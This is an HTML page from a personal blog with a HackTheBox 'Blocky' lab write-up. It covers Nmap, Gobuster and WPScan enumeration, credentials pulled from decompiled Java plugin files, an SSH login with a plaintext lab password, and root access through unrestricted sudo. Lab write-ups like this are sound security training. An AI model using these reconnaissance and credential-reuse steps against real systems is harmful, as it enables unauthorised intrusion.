Blocky","mainEntityOfPage":{"@type":"WebPage","@id":"https://jeevanachandra.github.io//hackthebox/retired/2020/03/16/Blocky.html"},"@type":"BlogPosting","author":{"@type":"Person","name":"Jeevan Chandra"},"url":"https://jeevanachandra.github.io//hackthebox/retired/2020/03/16/Blocky.html","image":"https://jeevanachandra.github.io//assets/img/sample/blocky.png","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="shortcut icon" href="">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-noto-sans@0.0.72/index.min.css">
+  <link rel="stylesheet" href="/assets/css/main.css">
+  <script src="/assets/js/main.js"></script><link type="application/atom+xml" rel="alternate" href="https://jeevanachandra.github.io//feed.xml" title="DC0deZer0">
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/styles/default.min.css">
+<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/highlight.min.js"></script>
+<!-- and it's easy to individually load additional languages -->
+<script charset="UTF-8" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/languages/go.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+// Init highlight js
+document.addEventListener('DOMContentLoaded', function(event) {
+  var els = document.querySelectorAll('pre code')
+
+  function addLangData(block) {
+    var outer = block.parentElement.parentElement.parentElement;
+    var lang = block.getAttribute('data-lang');
+    for (var i = 0; i < outer.classList.length; i++) {
+      var cls = outer.classList[i];
+      if (cls.startsWith('language-')) {
+        lang = cls;
+        break;
+      }
+    }
+    if (!lang) {
+      cls = block.getAttribute('class');
+      lang = cls ? cls.replace('hljs ', '') : '';
+    }
+    if (lang.startsWith('language-')) {
+      lang = lang.substr(9);
+    }
+    block.setAttribute('class', 'hljs ' + lang);
+    block.parentNode.setAttribute('data-lang', lang);
+  }
+
+  function addBadge(block) {
+    var enabled = ('true' || 'true').toLowerCase();
+    if (enabled == 'true') {
+      var pre = block.parentElement;
+      pre.classList.add('badge');
+    }
+  }
+
+  function handle(block) {
+    addLangData(block);
+    addBadge(block)
+    hljs.highlightBlock(block);
+  }
+
+  for (var i = 0; i < els.length; i++) {
+    var el = els[i];
+    handle(el);
+  }
+});
+</script>
+
+<style>
+  /* code language badge */
+  pre.badge::before {
+    content: attr(data-lang);
+    color: #fff;
+    background-color: #ff4e00;
+    padding: 0 .5em;
+    border-radius: 0 2px;
+    text-transform: uppercase;
+    text-align: center;
+    min-width: 32px;
+    display: inline-block;
+    position: absolute;
+    right: 0;
+  }
+
+  /* fix wrong badge display for firefox browser */
+  code > table pre::before {
+    display: none;
+  }
+</style>
+</head>
+<body>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<header class="site-header " role="banner">
+
+  <div class="wrapper">
+    <div class="site-header-inner">
+<span class="site-brand"><a class="site-brand-inner" rel="author" href="/">
+  <img class="site-favicon" title="DC0deZer0" src="" onerror="this.style.display='none'">
+  DC0deZer0
+</a>
+</span><nav class="site-nav">
+          <input type="checkbox" id="nav-trigger" class="nav-trigger">
+          <label for="nav-trigger">
+            <span class="menu-icon">
+              <svg viewbox="0 0 18 15" width="18px" height="15px">
+                <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"></path>
+              </svg>
+            </span>
+          </label>
+
+          <div class="trigger">
+<a class="page-link" href="/About.html">ABOUT</a><a class="page-link" href="/VulnMachines.html">VULNERABLE MACHINES</a><a class="page-link" href="/archives.html">ARCHIVES</a><a class="page-link" href="/categories.html">CATEGORIES</a><a class="page-link" href="/">HOME</a><a class="page-link" href="/tags.html">TAGS</a>
+
+
+
+
+<span class="page-link">
+
+<div id="google_translate_element" style="display: none;">
+</div>
+
+<span class="ct-language">
+  <ul class="list-unstyled ct-language-dropdown">
+    
+      <li>
+        <a href="#" class="lang-select" data-lang="en">
+          
+          <img src="https://www.countryflags.io/us/flat/64.png" title="English">
+          
+        </a>
+      </li>
+    
+      <li>
+        <a href="#" class="lang-select" data-lang="fr">
+          
+          <img src="https://www.countryflags.io/fr/flat/64.png" title="Franch">
+          
+        </a>
+      </li>
+    
+      <li>
+        <a href="#" class="lang-select" data-lang="zh-CN">
+          
+          <img src="https://www.countryflags.io/cn/flat/64.png" title="Chinese(Simple)">
+          
+        </a>
+      </li>
+    
+      <li>
+        <a href="#" class="lang-select" data-lang="ja">
+          
+          <img src="https://www.countryflags.io/jp/flat/64.png" title="Japan">
+          
+        </a>
+      </li>
+    
+      <li>
+        <a href="#" class="lang-select" data-lang="ko">
+          
+          <img src="https://www.countryflags.io/kr/flat/64.png" title="Korean">
+          
+        </a>
+      </li>
+    
+      <li>
+        <a href="#" class="lang-select" data-lang="ru">
+          
+          <img src="https://www.countryflags.io/ru/flat/64.png" title="Russia">
+          
+        </a>
+      </li>
+    
+  </ul>
+</span>
+
+<script type="text/javascript">
+function googleTranslateElementInit() {
+  new google.translate.TranslateElement({
+    pageLanguage: '',
+    autoDisplay: false,
+    layout: google.translate.TranslateElement.InlineLayout.VERTICAL
+  }, 'google_translate_element');
+
+  function restoreLang() {
+    var iframe = document.getElementsByClassName('goog-te-banner-frame')[0];
+    if (!iframe) return;
+
+    var innerDoc = iframe.contentDocument || iframe.contentWindow.document;
+    var restore_el = innerDoc.getElementsByTagName("button");
+
+    for (var i = 0; i < restore_el.length; i++) {
+      if (restore_el[i].id.indexOf("restore") >= 0) {
+        restore_el[i].click();
+        var close_el = innerDoc.getElementsByClassName("goog-close-link");
+        close_el[0].click();
+        return;
+      }
+    }
+  }
+
+  function triggerHtmlEvent(element, eventName) {
+    var event;
+    if (document.createEvent) {
+      event = document.createEvent('HTMLEvents');
+      event.initEvent(eventName, true, true);
+      element.dispatchEvent(event);
+    } else {
+      event = document.createEventObject();
+      event.eventType = eventName;
+      element.fireEvent('on' + event.eventType, event);
+    }
+  }
+
+  var googleCombo = document.querySelector("select.goog-te-combo");
+  var langSelect = document.querySelector('.ct-language');
+  langSelect.addEventListener('click', function(event) {
+    if (!event.target) {
+      return;
+    }
+
+    var selected = document.querySelector('.ct-language .ct-language-selected');
+    if (selected) {
+      selected.classList.remove('ct-language-selected');
+    }
+
+    var target = event.target;
+    while (target && target !== langSelect ) {
+      if (target.matches('.lang-select')) {
+        break;
+      }
+      target = target.parentElement;
+    }
+
+    if (target && target.matches('.lang-select')) {
+      var lang = target.getAttribute('data-lang');
+      if (googleCombo.value == lang) {
+        restoreLang();
+      } else {
+        target.parentElement.classList.add('ct-language-selected');
+        googleCombo.value = lang;
+        triggerHtmlEvent(googleCombo, 'change');
+      }
+    }
+
+    event.preventDefault();
+  });
+}
+</script>
+
+<script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
+</span>
+</div>
+        </nav>
+</div>
+  </div>
+</header>
+
+<script>
+  (function() {
+    var lastScrollY = getScrollPos().y;
+    var documentElement = document.documentElement;
+
+    function storeScrollData() {
+      var y = getScrollPos().y;var scrollStatus = "";
+
+      if (y <= 0) {
+        scrollStatus = "top";
+      } else if ((window.innerHeight + y) >= document.body.offsetHeight) {
+        scrollStatus = "bottom";
+      } else {
+        var isScrollDown = (y - lastScrollY > 0) ? true : false;
+        scrollStatus = isScrollDown ? "down" : "up";
+      }
+
+      lastScrollY = y;
+      documentElement.setAttribute("data-scroll-status", scrollStatus);
+    }
+
+    window.addEventListener('scroll', function(e) {
+      storeScrollData();
+    });
+
+    storeScrollData();
+  })();
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+  function hashLocate(hashValue) {
+    hashValue = hashValue.replace(/^.*#h-/, '');
+    var element = document.getElementById(hashValue);
+
+    if (!element) {
+      return;
+    }
+
+    var header = document.querySelector('header.site-header');
+    var headerRect = header.getBoundingClientRect();
+    var headerTop = Math.floor(headerRect.top);
+    var headerHeight = Math.floor(headerRect.height);
+    var scrollPos = getScrollPos();
+    var offsetY = element.offsetTop - (headerTop + headerHeight + 20);
+
+    if (offsetY == scrollPos.y) {
+      return;
+    }
+
+    if (headerTop == 0  && offsetY > scrollPos.y) {
+      offsetY += headerHeight + 2;
+    } else if (headerTop < 0  && offsetY < scrollPos.y) {
+      offsetY -= headerHeight - 2;
+    }
+
+    smoothScrollTo(offsetY);
+  }
+
+  // The first event occurred
+  window.addEventListener('load', function(event) {
+    if (window.location.hash) {
+      hashLocate(window.location.hash);
+    }
+  });
+
+  // The first event occurred
+  window.addEventListener('click', function(event) {
+    if (event.target.tagName.toLowerCase() == 'a') {
+      hashLocate(event.target.getAttribute('href'));
+    }
+  });
+</script>
+<div class="theme-toggle">
+  <input type="checkbox" id="theme-switch">
+  <label for="theme-switch">
+    <div class="toggle"></div>
+    <div class="names">
+      <p class="light">Light</p>
+      <p class="dark">Dark</p>
+    </div>
+  </label>
+</div>
+
+
+
+
+<script>
+  (function() {
+    var sw = document.getElementById('theme-switch');
+    var html = document.getElementsByTagName('html')[0];
+    var nightModeOption = ('auto' || 'auto').toLowerCase();
+    var storage = nightModeOption === 'manual'
+        ? localStorage
+        : sessionStorage;
+    var themeData = loadThemeData();
+
+    function saveThemeData(data) {
+      storage.setItem('theme', JSON.stringify(data));
+    }
+
+    function loadThemeData() {
+      var data = storage.getItem('theme');
+      try {
+        data = JSON.parse(data ? data : '');
+      } catch(e) {
+        data = { nightShift: undefined, autoToggleAt: 0 };
+        saveThemeData(data);
+      }
+      return data;
+    }
+
+    function handleThemeToggle(nightShift) {
+      themeData.nightShift = nightShift;
+      saveThemeData(themeData);
+      html.dataset.theme = nightShift ? 'dark' : 'light';
+      setTimeout(function() {
+        sw.checked = nightShift ? true : false;
+      }, 50);
+    }
+
+    function autoThemeToggle() {
+      // Next time point of theme toggle
+      var now = new Date();
+      var toggleAt = new Date();
+      var hours = now.getHours();
+      var nightShift = hours >= 19 || hours <=7;
+
+      if (nightShift) {
+        if (hours > 7) {
+          toggleAt.setDate(toggleAt.getDate() + 1);
+        }
+        toggleAt.setHours(7);
+      } else {
+        toggleAt.setHours(19);
+      }
+
+      toggleAt.setMinutes(0);
+      toggleAt.setSeconds(0);
+      toggleAt.setMilliseconds(0)
+
+      var delay = toggleAt.getTime() - now.getTime();
+
+      // auto toggle theme mode
+      setTimeout(function() {
+        handleThemeToggle(!nightShift);
+      }, delay);
+
+      return {
+        nightShift: nightShift,
+        toggleAt: toggleAt.getTime()
+      };
+    }
+
+    // Listen the theme toggle event
+    sw.addEventListener('change', function(event) {
+      handleThemeToggle(event.target.checked);
+    });
+
+    if (nightModeOption == 'auto') {
+      var data = autoThemeToggle();
+
+      // Toggle theme by local setting
+      if (data.toggleAt > themeData.autoToggleAt) {
+        themeData.autoToggleAt = data.toggleAt;
+        handleThemeToggle(data.nightShift);
+      } else {
+        handleThemeToggle(themeData.nightShift);
+      }
+    } else if (nightModeOption == 'manual') {
+      handleThemeToggle(themeData.nightShift);
+    } else {
+      var nightShift = themeData.nightShift;
+      if (nightShift === undefined) {
+        nightShift = nightModeOption === 'on';
+      }
+      handleThemeToggle(nightShift);
+    }
+  })();
+</script>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <div class="framework">
+  <section class="main">
+
+     <div class="post">
+  <section>
+
+
+
+
+
+
+
+
+
+<header class="post-header">
+  <h1 class="post-title p-name" itemprop="name headline">HackTheBox Blocky</h1>
+  <h3 class="post-subtitle"></h3>
+
+  <p class="post-meta">
+    <time class="dt-published" datetime="2020-03-16T22:04:00+05:30" itemprop="datePublished"><i class="fa fa-calendar"></i> Mar 16, 2020
+    </time>
+    
+    <img src="/assets/img/sample/blocky.png">
+    
+    
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <span class="post-reading-time left-vsplit"><i class="fa fa-clock-o"></i> About 8 mins</span>
+  </p>
+<div class="post-tags">
+<a class="post-tag" href="/tags.html#linux">#linux</a><a class="post-tag" href="/tags.html#gobuster">#gobuster</a>
+</div></header>
+<article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+    <div class="post-content e-content" itemprop="articleBody">
+
+      <h2 id="lets-get-started">Let’s get started</h2>
+
+<h2 id="as-always-hacking-starts-with-nmap-scan">As always hacking starts with NMAP scan.</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-26 15:13 EDT
+Nmap scan report for 10.10.10.37
+Host is up (0.015s latency).
+
+PORT      STATE  SERVICE   REASON         VERSION
+21/tcp    open   ftp       syn-ack ttl 63 ProFTPD 1.3.5a
+22/tcp    open   ssh       syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+80/tcp    open   http      syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
+|\_http-generator: WordPress 4.8
+| http-methods: 
+|\_  Supported Methods: GET HEAD POST OPTIONS
+|\_http-server-header: Apache/2.4.18 \(Ubuntu)
+|\_http-title: BlockyCraft &amp;#8211; Under Construction!
+8192/tcp  closed sophos    reset ttl 63
+25565/tcp open   minecraft syn-ack ttl 63 Minecraft 1.11.2 (Protocol: 127, Message: A Minecraft Server, Users: 0/20)
+Aggressive OS guesses: Linux 3.10 - 4.11 (94%), Linux 3.13 (94%), Linux 3.13 or 4.2 (94%), Linux 4.2 (94%), Linux 4.4 (94%), Linux 3.16 (92%), Linux 
+</code></pre></div></div>
+
+<p>This Looks like a <code>wordpress</code> site</p>
+
+<p><img src="/assets/img/sample/blocky/blocky1.png" alt=""></p>
+
+<h2 id="gobuster">Gobuster</h2>
+
+<p>Let’s find out the other files and dir on the wordpress site. 
+    ===============================================================
+    Gobuster v3.0.1
+    by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@<em>FireFart</em>)
+    ===============================================================
+    [+] Url:            http://10.10.10.37
+    [+] Threads:        10
+    [+] Wordlist:       /usr/share/wordlists/dirb/common.txt
+    [+] Status codes:   200,204,301,302,307,401,403
+    [+] User Agent:     gobuster/3.0.1
+    [+] Timeout:        10s
+    ===============================================================
+    Starting gobuster
+    ===============================================================
+    /.hta (Status: 403)
+    /.htaccess (Status: 403)
+    /.htpasswd (Status: 403)
+    /index.php (Status: 301)
+    /javascript (Status: 301)
+    /phpmyadmin (Status: 301)
+    /plugins (Status: 301)
+    /server-status (Status: 403)
+    /wiki (Status: 301)
+    /wp-admin (Status: 301)
+    /wp-content (Status: 301)
+    /wp-includes (Status: 301)
+    ===============================================================</p>
+
+<h2 id="finding-users-using-wpscan">Finding Users using <code>WPSCAN</code>
+</h2>
+
+<p>Checking the users….
+    <strong>__</strong><strong>__</strong><strong>__</strong><strong>__</strong><strong>__</strong><strong>__</strong><strong>__</strong><strong>__</strong><strong>__</strong><strong>__</strong><strong>_
+            __          __</strong><strong>_   __</strong>_
+            \ \        / /  __ \ / ____|
+            \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+            \ \/  \/ / |  ___/ ___ \ / __|/ _` | ‘_ <br>
+                \  /\  /  | |     ____) | (__| (_| | | | |
+                \/  \/   |_|    |_____/ ___|__,_|_| |_|</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        WordPress Security Scanner by the WPScan Team
+                        Version 3.8.2
+    Sponsored by Automattic - https://automattic.com/
+    @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: http://10.10.10.37/ [10.10.10.37]
+
+Interesting Finding(s):
+
+[+] Headers
+| Interesting Entry: Server: Apache/2.4.18 \(Ubuntu)
+| Found By: Headers \(Passive Detection)
+| Confidence: 100%
+
+[+] XML-RPC seems to be enabled: http://10.10.10.37/xmlrpc.php
+| Found By: Direct Access \(Aggressive Detection)
+| Confidence: 100%
+| References:
+|  - http://codex.wordpress.org/XML-RPC\_Pingback\_API
+|  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress\_ghost\_scanner
+|  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress\_xmlrpc\_dos
+|  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress\_xmlrpc\_login
+|  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress\_pingback\_access
+
+[+] http://10.10.10.37/readme.html
+| Found By: Direct Access \(Aggressive Detection)
+| Confidence: 100%
+
+[+] Upload directory has listing enabled: http://10.10.10.37/wp-content/uploads/
+| Found By: Direct Access \(Aggressive Detection)
+| Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: http://10.10.10.37/wp-cron.php
+| Found By: Direct Access \(Aggressive Detection)
+| Confidence: 60%
+| References:
+|  - https://www.iplocation.net/defend-wordpress-from-ddos
+|  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 4.8 identified (Insecure, released on 2017-06-08).
+| Found By: Rss Generator \(Passive Detection)
+|  - http://10.10.10.37/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=4.8&lt;/generator&gt;
+|  - http://10.10.10.37/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=4.8&lt;/generator&gt;
+
+[+] WordPress theme in use: twentyseventeen
+| Location: http://10.10.10.37/wp-content/themes/twentyseventeen/
+| Last Updated: 2020-03-31T00\:00\:00.000Z
+| Readme: http://10.10.10.37/wp-content/themes/twentyseventeen/README.txt
+| \[!] The version is out of date, the latest version is 2.3
+| Style URL: http://10.10.10.37/wp-content/themes/twentyseventeen/style.css?ver=4.8
+| Style Name: Twenty Seventeen
+| Style URI: https://wordpress.org/themes/twentyseventeen/
+| Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
+| Author: the WordPress team
+| Author URI: https://wordpress.org/
+|
+| Found By: Css Style In Homepage \(Passive Detection)
+|
+| Version: 1.3 \(80% confidence)
+| Found By: Style \(Passive Detection)
+|  - http://10.10.10.37/wp-content/themes/twentyseventeen/style.css?ver=4.8, Match: 'Version: 1.3'
+
+[+] Enumerating All Plugins (via Passive Methods)
+
+[i] No plugins Found.
+
+[+] Enumerating Most Popular Themes (via Passive and Aggressive Methods)
+
+Checking Known Locations -: |==============================================================================================================================================================================================================================================|
+[+] Checking Theme Versions (via Passive and Aggressive Methods)
+
+[i] Theme(s) Identified:
+
+[+] twentyfifteen
+| Location: http://10.10.10.37/wp-content/themes/twentyfifteen/
+| Last Updated: 2020-03-31T00\:00\:00.000Z
+| Readme: http://10.10.10.37/wp-content/themes/twentyfifteen/readme.txt
+| \[!] The version is out of date, the latest version is 2.6
+| Style URL: http://10.10.10.37/wp-content/themes/twentyfifteen/style.css
+| Style Name: Twenty Fifteen
+| Style URI: https://wordpress.org/themes/twentyfifteen/
+| Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
+| Author: the WordPress team
+| Author URI: https://wordpress.org/
+|
+| Found By: Known Locations \(Aggressive Detection)
+|  - http://10.10.10.37/wp-content/themes/twentyfifteen/, status: 500
+|
+| Version: 1.8 \(80% confidence)
+| Found By: Style \(Passive Detection)
+|  - http://10.10.10.37/wp-content/themes/twentyfifteen/style.css, Match: 'Version: 1.8'
+
+[+] twentyseventeen
+| Location: http://10.10.10.37/wp-content/themes/twentyseventeen/
+| Last Updated: 2020-03-31T00\:00\:00.000Z
+| Readme: http://10.10.10.37/wp-content/themes/twentyseventeen/README.txt
+| \[!] The version is out of date, the latest version is 2.3
+| Style URL: http://10.10.10.37/wp-content/themes/twentyseventeen/style.css
+| Style Name: Twenty Seventeen
+| Style URI: https://wordpress.org/themes/twentyseventeen/
+| Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
+| Author: the WordPress team
+| Author URI: https://wordpress.org/
+|
+| Found By: Urls In Homepage \(Passive Detection)
+| Confirmed By: Known Locations \(Aggressive Detection)
+|  - http://10.10.10.37/wp-content/themes/twentyseventeen/, status: 500
+|
+| Version: 1.3 \(80% confidence)
+| Found By: Style \(Passive Detection)
+|  - http://10.10.10.37/wp-content/themes/twentyseventeen/style.css, Match: 'Version: 1.3'
+
+[+] twentysixteen
+| Location: http://10.10.10.37/wp-content/themes/twentysixteen/
+| Last Updated: 2020-03-31T00\:00\:00.000Z
+| Readme: http://10.10.10.37/wp-content/themes/twentysixteen/readme.txt
+| \[!] The version is out of date, the latest version is 2.1
+| Style URL: http://10.10.10.37/wp-content/themes/twentysixteen/style.css
+| Style Name: Twenty Sixteen
+| Style URI: https://wordpress.org/themes/twentysixteen/
+| Description: Twenty Sixteen is a modernized take on an ever-popular WordPress layout — the horizontal masthead ...
+| Author: the WordPress team
+| Author URI: https://wordpress.org/
+|
+| Found By: Known Locations \(Aggressive Detection)
+|  - http://10.10.10.37/wp-content/themes/twentysixteen/, status: 500
+|
+| Version: 1.3 \(80% confidence)
+| Found By: Style \(Passive Detection)
+|  - http://10.10.10.37/wp-content/themes/twentysixteen/style.css, Match: 'Version: 1.3'
+
+[+] Enumerating Timthumbs (via Passive and Aggressive Methods)
+
+Checking Known Locations -: |==============================================================================================================================================================================================================================================|
+
+[i] No Timthumbs Found.
+
+[+] Enumerating Users (via Passive and Aggressive Methods)
+
+Brute Forcing Author IDs -: |==============================================================================================================================================================================================================================================|
+
+[i] User(s) Identified:
+
+[+] notch
+| Found By: Author Posts - Author Pattern \(Passive Detection)
+| Confirmed By:
+|  Wp Json Api \(Aggressive Detection)
+|   - http://10.10.10.37/index.php/wp-json/wp/v2/users/?per\_page=100&amp;page=1
+|  Author Id Brute Forcing - Author Pattern \(Aggressive Detection)
+|  Login Error Messages \(Aggressive Detection)
+
+[+] Notch
+| Found By: Rss Generator \(Passive Detection)
+| Confirmed By: Login Error Messages \(Aggressive Detection)
+
+[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up
+
+[+] Requests Done: 2989
+[+] Cached Requests: 66
+[+] Data Sent: 742.701 KB
+[+] Data Received: 418.53 KB
+[+] Memory used: 227.039 MB
+[+] Elapsed time: 00\:00\:13
+</code></pre></div></div>
+
+<p>So the user identified as notch</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[i] User(s) Identified:
+
+[+] notch
+| Found By: Author Posts - Author Pattern \(Passive Detection)
+| Confirmed By:
+|  Wp Json Api \(Aggressive Detection)
+|   - http://10.10.10.37/index.php/wp-json/wp/v2/users/?per\_page=100&amp;page=1
+|  Author Id Brute Forcing - Author Pattern \(Aggressive Detection)
+|  Login Error Messages \(Aggressive Detection)
+
+[+] Notch
+| Found By: Rss Generator \(Passive Detection)
+| Confirmed By: Login Error Messages \(Aggressive Detection)
+</code></pre></div></div>
+
+<p>Doing a little bit of more ennumeration, something strange comes in place of <code>PLUGINS</code> directory.</p>
+
+<p><img src="/assets/img/sample/blocky/blocky2.png" alt=""></p>
+
+<h2 id="enumerating-a-bit-more-deeper">Enumerating a bit more deeper</h2>
+
+<p>Download both files and we’ll use a java decompiler such as jad to view the contents of the files.</p>
+
+<p>I use JD-Gui to be decompile the java files.</p>
+
+<p><img src="/assets/img/sample/blocky/blocky3.png" alt=""></p>
+
+<p>As the username and password are found let’s login via <code>SSH</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sh notch@10.10.10.37
+notch@10.10.10.37's password: 8YsqfCTnvxAUeduzjNSXe22
+
+#Check what we can do with the account
+notch@Blocky:~$ 
+</code></pre></div></div>
+
+<h2 id="getting-usertxt">Getting User.txt</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>notch@Blocky:~$ cat user.txt 
+5************************
+</code></pre></div></div>
+
+<h2 id="getting-roottxt">Getting Root.txt</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>notch@Blocky:~$ sudo -l
+[sudo] password for notch: 
+Matching Defaults entries for notch on Blocky:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User notch may run the following commands on Blocky:
+    (ALL : ALL) ALL
+</code></pre></div></div>
+
+<p>As the user has permission to <code>ALL</code> we can run <code>sudo -i</code> to get <code>ROOT</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>notch@Blocky:~$ sudo -i 
+root@Blocky:~# cat root.txt 
+0************************
+</code></pre></div></div>
+
+
+
+    </div>
+
+</article>
+<div class="post-nav">
+<a class="previous" href="/hackthebox/retired/2020/03/13/Lame.html" title="HackTheBox lame">HackTheBox lame</a><a class="next" href="/tryhackme/2020/03/29/Mrrobot.html" title="Tryhackme MrRobot">Tryhackme MrRobot</a>
+</div>
+<div class="post-related">
+      <div>Related Articles</div>
+      <ul>
+        <li><a class="post-link" href="/hackthebox/retired/2020/03/11/Devel.html" title="Tryhackme MrRobot">HackTheBox Devel</a></li>
+<li><a class="post-link" href="/hackthebox/retired/2020/06/19/Sauna.html" title="Tryhackme MrRobot">HackTheBox Sauna</a></li>
+<li><a class="post-link" href="/tryhackme/2020/07/08/Haskhell.html" title="Tryhackme MrRobot">Tryhackme Haskhell</a></li>
+<li><a class="post-link" href="/otherposts/2020/04/15/Kali-Linux-Tools.html" title="Tryhackme MrRobot">Kali-Linux-Tools</a></li>
+</ul>
+    </div>
+<div class="post-comments"></div></section>
+</div>
+
+
+  </section>
+  <section class="sidebar" style="margin-left: 15px;">
+    <!-- Get sidebar items --><style type="text/css" media="screen">
+.post-menu ul {
+  list-style: none;
+  padding: 0;
+  margin: 0;
+}
+</style>
+
+<div class="post-menu">
+  <div class="post-menu-title"> Contents</div>
+  <div class="post-menu-content"></div>
+</div>
+
+<script>
+  function generateContent() {
+    var menu = document.querySelector(".post-menu");
+    var menuContent =  menu.querySelector(".post-menu-content");
+    var headings = document.querySelector(".post-content").querySelectorAll("h2, h3, h4, h5, h6");
+
+    // Hide menu when no headings
+    if (headings.length === 0) {
+      return menu.style.display = "none";
+    }
+
+    // Generate post menu
+    var menuHTML = '';
+    for (var i = 0; i < headings.length; i++) {
+      var h = headings[i];
+      menuHTML += (
+        '<li class="h-' + h.tagName.toLowerCase() + '">'
+        + '<a href="#h-' + h.getAttribute('id') + '">' + h.textContent + '</a></li>');
+    }
+
+    menuContent.innerHTML = '<ul>' + menuHTML + '</ul>';
+
+    // The header element
+    var header = document.querySelector('header.site-header');
+
+    function doMenuCollapse(index, over_items) {
+      var items = menuContent.firstChild.children;
+
+      if (over_items == undefined) {
+        over_items = 20;
+      }
+
+      if (items.length < over_items) {
+        return;
+      }
+
+      var activeItem = items[index];
+      var beginItem = activeItem
+      var endItem = activeItem
+      var beginIndex = index;
+      var endIndex = index + 1;
+      while (beginIndex >= 0
+        && !items[beginIndex].classList.contains('h-h2')) {
+        beginIndex -= 1;
+      }
+      while (endIndex < items.length
+        && !items[endIndex].classList.contains('h-h2')) {
+        endIndex += 1;
+      }
+      for (var i = 0; i < beginIndex; i++) {
+        item = items[i]
+        if (!item.classList.contains('h-h2')) {
+          item.style.display = 'none';
+        }
+      }
+      for (var i = beginIndex + 1; i < endIndex; i++) {
+        item = items[i]
+        // if (!item.classList.contains('h-h2')) {
+          item.style.display = '';
+        // }
+      }
+      for (var i = endIndex; i < items.length; i++) {
+        item = items[i]
+        if (!item.classList.contains('h-h2')) {
+          item.style.display = 'none';
+        }
+      }
+    }
+
+    // Init menu collapsed
+    doMenuCollapse(-1);
+
+    // Active the menu item
+    window.addEventListener('scroll', function (event) {
+      var lastActive = menuContent.querySelector('.active');
+      var changed = true;
+      var activeIndex = -1;
+      for (var i = headings.length - 1; i >= 0; i--) {
+        var h = headings[i];
+        var headingRect = h.getBoundingClientRect();
+        var headerRect = header.getBoundingClientRect();
+        var headerTop = Math.floor(headerRect.top);
+        var headerHeight = Math.floor(headerRect.height);
+        var headerHeight = headerTop + headerHeight + 20;
+        if (headingRect.top <= headerHeight) {
+          var id = 'h-' + h.getAttribute('id');
+          var a = menuContent.querySelector('a[href="#' + id  + '"]');
+          var curActive = a.parentNode;
+          if (curActive) {
+            curActive.classList.add('active');
+            activeIndex = i;
+          }
+          if (lastActive == curActive) {
+            changed = false;
+          }
+          break;
+        }
+      }
+      if (changed) {
+        if (lastActive) {
+          lastActive.classList.remove('active');
+        }
+        doMenuCollapse(activeIndex);
+      }
+      event.preventDefault();
+    });
+  }
+  generateContent();
+</script>
+</section>
+</div>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+    <div class="site-footer-inner">
+      <div>Copyright © 2020-2022 @Jeevan</div>
+      <div>Powered by <a title="Jekyll is a simple, blog-aware, static site
+      generator." href="http://jekyllrb.com/">Jekyll</a> &amp; <a title="Yat, yet
